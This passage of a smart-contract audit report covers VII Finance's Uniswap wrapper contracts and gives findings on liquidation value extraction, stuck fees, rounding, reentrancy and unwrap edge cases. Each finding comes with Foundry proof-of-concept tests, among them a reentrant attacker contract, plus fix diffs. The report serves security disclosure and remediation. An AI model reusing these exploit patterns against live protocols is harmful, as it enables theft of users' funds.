Here, the total supply of ERC-6909 tokens of the specified `tokenId` is erroneously used in the multiplication when this should instead be normalized to the actual amount of ERC-6909 tokens owned by the user.

**Impact:** More value can be extracted by liquidations than expected, causing the liquidated accounts to incur larger losses. This can occur by repeated partial liquidation or in the scenario a borrower transfers a portion of their position to a separate account.

**Proof of Concept:** As demonstrated by the below PoCs, the liquidator receives more value than expected when transferring the specified amount of value from a user who doesn't own 100% of the ERC-6909 supply for all `tokenIds` enabled as collateral.

This first PoC demonstrates the scenario when transferring an amount of value from a **user who owns 100% of the ERC-6909 supply for all `tokenIds` enabled as collateral**. Here, the transfer works as expected and the liquidator receives the correct share of each collateral:

```solidity
function test_transferExpectedPoC() public {
    int256 liquidityDelta = -19999;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId1, borrower);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    address borrower2 = makeAddr("borrower2");

    // @audit-info => borrower owns a 100% of ERC-6909 supply of each tokenId
    uint256 beforeLiquidationBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    address liquidator = makeAddr("liquidator");
    uint256 transferAmount = beforeLiquidationBalanceOfBorrower1 / 2;
    wrapper.transfer(liquidator, transferAmount);

    uint256 finalBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    // @audit-info => liquidated borrower got seized the exact amount of assets requested by the liquidator
    startHoax(liquidator);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    assertApproxEqAbs(wrapper.balanceOf(liquidator), transferAmount, ALLOWED_PRECISION_IN_TESTS);
}
```

However, this second PoC demonstrates the scenario when transferring an amount of value from a **user who doesn't own 100% of the ERC-6909 supply for all `tokenIds` enabled as collateral**. In this case, the transfer does not work as expected and the actual amount of value transferred to the liquidator is more than what was requested:

```solidity
function test_transferUnexpectedPoC() public {
    int256 liquidityDelta = -19999;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId1, borrower);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    address borrower2 = makeAddr("borrower2");

    // @audit-info => liquidated borrower doesn't own 100% of both tokenIds
    wrapper.transfer(borrower2, tokenId1, wrapper.FULL_AMOUNT() / 2);

    uint256 beforeLiquidationBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    address liquidator = makeAddr("liquidator");
    uint256 transferAmount = beforeLiquidationBalanceOfBorrower1 / 2;
    wrapper.transfer(liquidator, transferAmount);

    uint256 finalBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    startHoax(liquidator);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // @audit-issue => because liquidated borrower did not have 100% of shares for both tokenIds, the liquidator earned more than requested
    //@audit-issue => liquidated borrower got seized more assets than they should have
    assertApproxEqAbs(wrapper.balanceOf(liquidator), transferAmount, ALLOWED_PRECISION_IN_TESTS);
}
```

**Recommended Mitigation:** On the `normalizedToFull()`, change the formula as follows:
```diff
    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
-       return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
+       return Math.mulDiv(amount, balanceOf(_msgSender(), tokenId), currentBalance);
    }
```

**VII Finance:** Fixed in commit [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a).

**Cyfrin:** Verified. The sender's actual balance of `tokenId` is now used in normalization instead of the ERC-6909 total supply.

\clearpage
## Medium Risk


### Fees can become stuck in `UniswapV4Wrapper`

**Description:** When a modification is made to Uniswap V4 position liquidity, such as in the case of a partial `UniswapV4Wrapper` unwrap which decreases liquidity, any outstanding fees are also transferred and required to be completely settled. For multiple holders of a given ERC-6909 `tokenId`, a proportional share is escrowed and paid out during a given holder's next interaction with the wrapper contract. However, there exists an edge case in which fees can become stuck in `UniswapV4Wrapper` if the final holder performs a full unwrap through the overload which transfers the underlying position directly to the caller.

Consider the following scenario:
* Alice has full ownership of a position `tokenId1`.
* Assume LP fees have accrued in the position.
* Alice partially unwraps `tokenId1` to remove a portion of the underlying liquidity.
* This accrues LP fees corresponding to the remainder of the position to the `UniswapV4Wrapper`.
* Alice max borrows and later gets fully liquidated.
* The liquidator fully unwraps the `tokenId1` position and received the underlying NFT but loses their share of the previously-accrued fees.
* The liquidator removes all the liquidity of the underlying position they received for the full liquidation, and burns the position.
* As a result, it is impossible to retrieve the fees remaining in the wrapper because the position has been burnt and is impossible to mint the same `tokenId` again.

**Impact:** LP fees can become stuck in the `UniswapV4Wrapper` contract under certain edge cases. This loss has medium/high impact with medium likelihood.

**Proof of Concept:** The following test is a simplified demonstration of the issue:

```solidity
function test_finalLosesFeesPoC() public {
    int256 liquidityDelta = -19999;
    uint256 swapAmount = 100_000 * unit0;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    address borrower2 = makeAddr("borrower2");
    wrapper.transfer(borrower2, tokenId1, wrapper.FULL_AMOUNT() * 5 / 10);

    //swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), swapAmount);

    (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
        MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);

    console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);

    startHoax(borrower);
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.balanceOf(borrower, tokenId1),
        bytes("")
    );

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));

    startHoax(borrower2);
    wrapper.unwrap(borrower2, tokenId1, borrower2);

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
    if (currency0.balanceOf(address(wrapper)) > 0 && wrapper.totalSupply(tokenId1) == 0) {
        console.log("Fees stuck in wrapper!");
    }
}
```

**Recommended Mitigation:** Check whether there are any outstanding fees accrued for a given `tokenId` when performing a full unwrap and transfer these to the recipient along with the underlying NFT. This would also have the added benefit of avoiding dust accumulating in the contract which may arise from floor rounding during proportional share calculations using small ERC-6909 balances.

**VII Finance:** Fixed in commit [bf5f099](https://github.com/kankodu/vii-finance-smart-contracts/commit/bf5f099b5d73dbff8fa6d403cb54ee6474828ac4).

**Cyfrin:** Verified. Fees are now fully settled when performing a full unwrap.


### Rounding in favor of the violator can subject liquidators to losses during partial liquidation

**Description:** Currently, `ERC721WrapperBase::transfer` rounds in favor of the sender, or in the context of liquidation in favor of the violator:

```solidity
/// @notice For regular EVK vaults, it transfers the specified amount of vault shares from the sender to the receiver
/// @dev For ERC721WrapperBase, transfers a proportional amount of ERC6909 tokens (calculated as totalSupply(tokenId) * amount / balanceOf(sender)) for each enabled tokenId from the sender to the receiver.
/// @dev no need to check if sender is being liquidated, sender can choose to do this at any time
/// @dev When calculating how many ERC6909 tokens to transfer, rounding is performed in favor of the sender (typically the violator).
/// @dev This means that the sender may end up with a slightly larger amount of ERC6909 tokens than expected, as the rounding is done in their favor.
function transfer(address to, uint256 amount) external callThroughEVC returns (bool) {
    address sender = _msgSender();
    uint256 currentBalance = balanceOf(sender);

    uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);

    for (uint256 i = 0; i < totalTokenIds; ++i) {
        uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
        _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance)); //this concludes the liquidation. The liquidator can come back to do whatever they want with the ERC6909 tokens
    }
    return true;
}
```

This stems from the usage of `Math::mulDiv` in `ERC721WrapperBase` which performs floor rounding when calculating the normalized amount of ERC-6909 token to transfer for the given sender's underlying collateral value:

```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
}
```

However, this behavior can be leveraged by a malicious actor to inflate the value of their position. Considering the scenario in which a borrower enables multiple `tokenIds` as collateral, this is possible is they unwrap all but 1 wei of the ERC-6909 token balance for a given `tokenId`. This can also occur when one of the `tokenIds` is fully transferred per the proportional calculation by an earlier partial liquidation. In both cases, this leaves behind 1 wei due to rounding which can cause issues during subsequent liquidation.

Note that it is not possible to inflate the value of 1 wei of ERC-6909 token by adding liquidity to the underlying position since atomically unwrapping the full position, adding liquidity, and rewrapping (as required due to access control implemented by Uniswap when modifying liquidity owned by another account) would result in the `FULL_AMOUNT` of ERC-6909 tokens being minted again. It is, however, possible to leverage fee accrual from donations and swaps, which contributes to the value of the position, to inflate 1 wei in this manner.

Rounding should therefore be done in favor of the liquidator to avoid the scenario in which they are forced to either perform a full liquidation or sustain losses due to a partial liquidation in which they receive no ERC-6909 tokens.

**Impact:** Liquidators can be subject to losses during partial liquidation, especially if there has been significant fee accrual to the underlying Uniswap position in the time after the ERC-6909 token supply is reduced to 1 wei.

**Proof of Concept:** Run the following tests with `forge test --mt test_transferRoundingPoC -vvv`:

* Without the transfer inflation fix applied as described in H-02, the floor rounding setup can be observed in this first test:

```solidity
function test_transferRoundingPoC_currentTransfer() public {
    address borrower2 = makeAddr("borrower2");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // 2. borrower sends some of tokenId1 to borrower2
    wrapper.transfer(borrower2, wrapper.balanceOf(borrower) / 2);

    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);

    // 6. liquidator partially liquidates borrower
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);

    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));
}
```

* Assuming the H-02 fix is applied, losses to the liquidator during partial liquidations due to rounding in favor of the violator can be observed in the following test:

```solidity
function test_transferRoundingPoC_transferFixed() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // 2. borrower unwraps all but 1 wei of tokenId1
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.FULL_AMOUNT() - 1,
        bytes("")
    );

    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. swap to accrue fees
    swapExactInput(borrower, address(token0), address(token1), 100 * unit0);

    // 6. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);

    // 7. liquidator partially liquidates borrower but receives no tokenId1
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    uint256 liquidatorBalanceOfTokenId1Before = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2Before = wrapper.balanceOf(liquidator, tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);
    uint256 liquidatorBalanceOfTokenId1After = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2After = wrapper.balanceOf(liquidator, tokenId2);

    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));

    console.log("liquidatorBalanceOfTokenId1Before: %s", liquidatorBalanceOfTokenId1Before);
    console.log("liquidatorBalanceOfTokenId1After: %s", liquidatorBalanceOfTokenId1After);

    console.log("liquidatorBalanceOfTokenId2Before: %s", liquidatorBalanceOfTokenId2Before);
    console.log("liquidatorBalanceOfTokenId2After: %s", liquidatorBalanceOfTokenId2After);

    assertGt(liquidatorBalanceOfTokenId1After, liquidatorBalanceOfTokenId1Before);
    assertGt(liquidatorBalanceOfTokenId2After, liquidatorBalanceOfTokenId2Before);
}
```

**Recommended Mitigation:** Consider rounding in favor of the liquidator:

```diff
    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
-        return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
+        return Math.mulDiv(amount, balanceOf(_msgSender(), tokenId), currentBalance, Math.Rounding.Ceil);
    }
```

Also consider preventing liquidators from executing liquidations of zero value to avoid scenarios in which they can repeatedly extract 1 wei of a high-value position from the violator.

**VII Finance:** Fixed in commit [5e825d5](https://github.com/kankodu/vii-finance-smart-contracts/commit/5e825d5f2eee6789b646bd0f00e9a9a53b5039ca).

**Cyfrin:** Verified. Transfers now round up in favor of the receiver (typically the liquidator). Note that liquidators are still not explicitly prevented from executing liquidations of zero value.

**VII Finance:** When liquidation happens, the Euler vault associated with borrowed token, asks EVC to manipulate the injected `_msgSender()` to be violator and call transfer function with to = liquidator and amount = whatever liquidator deserves for taking on violator's debt.  As far as the wrapper is concerned, zero value liquidation is just a zero value transfer. The wrapper allows it the same way any other Euler vault that follow ERC20 standard allows for zero value transfers. We don't see a need for preventing the zero value transfers.

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Unsafe external calls made during proportional LP fee transfers can be used to reenter wrapper contracts

**Description:** `ERC721WrapperBase` exposes two overloads of the `unwrap()` function to perform full and partial unwrap of the ERC-6909 position for a given `tokenId`. The partial unwrap is used to burn a specified amount of ERC-6909 tokens from the caller and handles proportional distribution of LP fees between all ERC-6909 holders through the virtual `_unwrap()` function, transferring tokens directly from the `UniswapV3Pool` and `PoolManager` for `UniswapV3Wrapper` and `UniswapV4Wrapper` respectively:

```solidity
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    // @audit - native ETH/ERC-777 token can be used to reenter here
    _burnFrom(from, tokenId, amount);
}
```

For wrappers configured to use underlying positions that contain either tokens with transfer hooks (e.g. ERC-777) or native ETH in the case of Uniswap V4, the external call can be leveraged by the user-supplied `to` address to reenter execution before the sender's balance and the ERC-6909 token total supply is decreased.

Note that this is possible despite the application of the `callThroughEVC()` modifier. Execution ends up in `EthereumVaultConnector::call` which itself has the `nonReentrantChecksAndControlCollateral()` modifier applied; however, at this point control collateral is not in progress checks are deferred within the execution context, meaning it is possible to bypass the reverts in the modifier:

```solidity
/// @notice A modifier that verifies whether account or vault status checks are re-entered as well as checks for
/// controlCollateral re-entrancy.
modifier nonReentrantChecksAndControlCollateral() {
    {
        EC context = executionContext;

        if (context.areChecksInProgress()) {
            revert EVC_ChecksReentrancy();
        }

        if (context.isControlCollateralInProgress()) {
            revert EVC_ControlCollateralReentrancy();
        }
    }

    _;
}
```

**Impact:** The likelihood of this issue is medium/high since Uniswap V4 has support for native ETH which is commonly used as collateral across DeFi protocols. The impact is more difficult to quantify as it does not appear possible to leverage this reentrancy to bypass the vault protections for an undercollateralized borrow, due to reverts in deferred checks after the ERC-6909 burn with `E_AccountLiquidity()`, or otherwise break the ERC-6909 accounting. Recursive partial unwraps also appear to be unprofitable for an attacker.

**Proof of Concept:** Apply the following patch and execute `forge test --mt test_reentrancyPoC -vvv`:

```diff
---
 .../test/uniswap/UniswapV4Wrapper.t.sol       | 95 ++++++++++++++++++-
 1 file changed, 94 insertions(+), 1 deletion(-)

diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
index 2fce3ed..d9eaf45 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -40,6 +40,46 @@ import {UniswapMintPositionHelper} from "src/uniswap/periphery/UniswapMintPositi
 import {ActionConstants} from "lib/v4-periphery/src/libraries/ActionConstants.sol";
 import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";

+contract ReentrantBorrower {
+    bool entered;
+    ERC721WrapperBase wrapper;
+    uint256 tokenId;
+    IEVault eVault;
+    IEVC evc;
+
+    fallback() external payable {
+        if (!entered && address(wrapper) != address(0) && tokenId != 0 && address(eVault) != address(0)) {
+            console.log("reentrancy");
+            entered = true;
+
+            bool checksInProgress = evc.areChecksInProgress();
+            bool checksDeferred = evc.areChecksDeferred();
+            bool controlCollateralInProgress = evc.isControlCollateralInProgress();
+
+            assert(!checksInProgress);
+            assert(checksDeferred);
+            assert(!controlCollateralInProgress);
+
+            eVault.borrow(type(uint256).max, address(this));
+
+        }
+    }
+
+    function setEnabled(ERC721WrapperBase _wrapper, uint256 _tokenId, IEVault _eVault, IEVC _evc) external {
+        wrapper = _wrapper;
+        tokenId = _tokenId;
+        eVault = _eVault;
+        evc = _evc;
+    }
+}
+
 contract MockUniswapV4Wrapper is UniswapV4Wrapper {
     using StateLibrary for IPoolManager;

@@ -125,7 +165,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {

     TestRouter public router;

-    bool public constant TEST_NATIVE_ETH = false;
+    bool public constant TEST_NATIVE_ETH = true;

     function deployWrapper() internal override returns (ERC721WrapperBase) {
         currency0 = Currency.wrap(address(token0));
@@ -407,6 +447,59 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         }
     }

+    function test_reentrancyPoC() public {
+        address attacker = address(new ReentrantBorrower());
+
+        LiquidityParams memory params = LiquidityParams({
+            tickLower: TickMath.MIN_TICK + 1,
+            tickUpper: TickMath.MAX_TICK - 1,
+            liquidityDelta: -19999
+        });
+
+        deal(token0, attacker, 100 * unit0);
+        deal(token1, attacker, 100 * unit1);
+        startHoax(attacker);
+        SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+        (tokenId,,) = boundLiquidityParamsAndMint(params, attacker);
+
+        startHoax(attacker);
+        wrapper.underlying().approve(address(wrapper), tokenId);
+        wrapper.wrap(tokenId, attacker);
+        wrapper.enableTokenIdAsCollateral(tokenId);
+
+        evc.enableCollateral(attacker, address(wrapper));
+        evc.enableController(attacker, address(eVault));
+
+        console.log("eVault.debtOfExact(attacker) before: %s", eVault.debtOfExact(attacker));
+        console.log("balanceOf(attacker, tokenId) before: %s", wrapper.balanceOf(attacker, tokenId));
+        console.log("balanceOf(attacker) before: %s", wrapper.balanceOf(attacker));
+
+        assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT());
+        uint256 balanceBefore = wrapper.balanceOf(attacker);
+
+        ReentrantBorrower(payable(attacker)).setEnabled(wrapper, tokenId, eVault, evc);
+
+        wrapper.unwrap(
+            attacker,
+            tokenId,
+            attacker,
+            wrapper.FULL_AMOUNT() * 99/100,
+            bytes("")
+        );
+
+        console.log("eVault.debtOfExact(attacker) after: %s", eVault.debtOfExact(attacker));
+        console.log("balanceOf(attacker, tokenId) after: %s", wrapper.balanceOf(attacker, tokenId));
+        console.log("balanceOf(attacker) after: %s", wrapper.balanceOf(attacker));
+
+        assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT() / 100);
+        assertGt(balanceBefore, wrapper.balanceOf(attacker));
+    }
+
     function testSkim() public {
         LiquidityParams memory params = LiquidityParams({
             tickLower: TickMath.MIN_TICK + 1,
--
2.40.0

```

**Recommended Mitigation:** While it has not been possible to identify a clear and material attack, it is still advised to consider the application of a reentrancy guard to prevent unsafe external calls made during the execution LP fee transfers being allowed to call back into the wrapper contracts.

**VII Finance:** Fixed in commit [88c9eec](https://github.com/kankodu/vii-finance-smart-contracts/commit/88c9eec6af4db1aaf7ddbd6d5fdd8a0cc0b65d93).

**Cyfrin:** Verified. Transfers that can result in reentrancy now occur at the end of partial unwrap, after the ERC-6909 tokens are burned.


### Users can enable `tokenIds` as collateral even if they do not own any of the ERC-6909 supply

**Description:** It is possible for users to enable `tokenIds` that that they do not own as collateral. Based on the current remediated logic, it does not appear possible for this to be further weaponized beyond the blocking of liquidations, as described in C-01, stemming from the incorrect implementation `ERC721WrapperBase::normalizedToFull` as described in H-02. That said, this ability for a borrower to add a `tokenId` as collateral for which they have zero ERC-6909 balance should be explicitly forbidden. Liquidators who do not already own a share of the position but need to enable the `tokenId` as collateral to pass account liquidity checks should still be able to do so by utilizing the deferred checks of EVC batch calls.

**Impact:** Borrowers can freely enable `tokenIds` as collateral even if they do not own any of the underlying ERC-6909 balance.

**Proof of Concept:**
```solidity
function test_enableCollateralPoC() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (tokenId,,) = boundLiquidityParamsAndMint(params, borrower);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId);
    // avoid wrapping such that ERC-6909 total supply remains zero
    assertEq(wrapper.totalSupply(tokenId), 0);

    address borrower2 = makeAddr("borrower2");
    startHoax(borrower2);
    assertEq(wrapper.getEnabledTokenIds(borrower2).length, 0);
    wrapper.enableTokenIdAsCollateral(tokenId);
    assertEq(wrapper.getEnabledTokenIds(borrower2).length, 1);
}
```

**Recommended Mitigation:** Consider requiring a non-zero ERC-6909 balance when enabling collateral:

```diff
+   error TokenIdNotOwnedByBorrower(uint256 tokenId, address sender);

    function enableTokenIdAsCollateral(uint256 tokenId) public returns (bool enabled) {
        address sender = _msgSender();
        enabled = _enabledTokenIds[sender].add(tokenId);
        if (totalTokenIdsEnabledBy(sender) > MAX_TOKENIDS_ALLOWED) revert MaximumAllowedTokenIdsReached();
+       if (balanceOf(sender, tokenId) == 0) revert TokenIdNotOwnedByBorrower(tokenId, sender);
        if (enabled) emit TokenIdEnabled(sender, tokenId, true);
    }
```

**VII Finance:** Acknowledged. We dont want to be too restrictive. Liquidator might want to enable the `tokenIds` they get as collateral before they get it to prepare to collateralise the debt that they just took on.

**Cyfrin:** Acknowledged.


### Underlying liquidity position is not transferred when fully unwrapping through the partial unwrap overload

**Description:** While the `ERC721WrapperBase` partial unwrap overload is intended for use following partial liquidations, it is possible for the sole holder of an ERC-6909 token to use this function to perform a full unwrap by specifying the the total supply of the corresponding `tokenId`:

```solidity
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

The proportional share calculations implemented in the virtual `_unwrap()` will be executed to transfer the underlying principal balance plus LP fees to the sole holder, before burning the the entire ERC-6909 token supply and leaving the empty liquidity position NFT in the wrapper contract.

Given that the total supply of ERC-6909 tokens is now reduced to zero following such a call, the position can still be retrieved by performing a full unwrap of said empty position:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}
```

The caveat is that this can be performed by anyone, since `_burnFrom()` invoked with a zero amount will succeed for any sender without reverting:

```solidity
// ERC721WrapperBase
function _burnFrom(address from, uint256 tokenId, uint256 amount) internal {
    address sender = _msgSender();
    if (from != sender && !isOperator(from, sender)) {
        _spendAllowance(from, sender, tokenId, amount);
    }
    _burn(from, tokenId, amount);
}

// ERC6909
function _burn(address from, uint256 id, uint256 amount) internal {
    if (from == address(0)) {
        revert ERC6909InvalidSender(address(0));
    }
    _update(from, address(0), id, amount);
}

// ERC721WrapperBase
function _update(address from, address to, uint256 id, uint256 amount) internal virtual override {
    super._update(from, to, id, amount);
    if (from != address(0)) evc.requireAccountStatusCheck(from);
}

// ERC6909
function _update(address from, address to, uint256 id, uint256 amount) internal virtual {
    address caller = _msgSender();

    if (from != address(0)) {
        uint256 fromBalance = _balances[from][id];
        if (fromBalance < amount) {
            revert ERC6909InsufficientBalance(from, fromBalance, amount, id);
        }
        unchecked {
            // Overflow not possible: amount <= fromBalance.
            _balances[from][id] = fromBalance - amount;
        }
    }
    if (to != address(0)) {
        _balances[to][id] += amount;
    }

    emit Transfer(caller, from, to, id, amount);
}
```

This may not be desirable as a user who unwraps their position in this way may have their NFT retrieved or even burnt by a different account, and it will not be possible for them to mint the same `tokenId` once again.

**Impact:** An empty Uniswap V4 position remaining in the wrapper contract following full unwrap via the partial unwrap overload can be recovered and re-used by any sender by subsequently invoking the full unwrap and re-wrapping.

**Proof of Concept:**
```solidity
function test_unwrapPoC() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. borrow fully unwraps via partial unwrap
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );

    // 3. borrower retrieves the empty position via full unwrap
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower
    );

    // 4. borrower re-wraps the position
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
}
```

**Recommended Mitigation:** If the total supply of a given ERC-6909 token is reduced to zero following a partial unwrap, consider also transferring the underlying NFT to the recipient.

**VII Finance:** Acknowledged. If total supply of a `tokenId` is zero at the end of unwrap, we know it is worth zero. We dont care about the `tokenId` after that.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Extra data should only be decoded when its length is exactly 96 bytes

**Description:** When decreasing liquidity, both `UniswapV3Wrapper` and `UniswapV4Wrapper` assume that it will be possible to decode extra data if is has a non-zero length:

```solidity
// UniswapV3Wrapper usage
(uint256 amount0Min, uint256 amount1Min, uint256 deadline) =
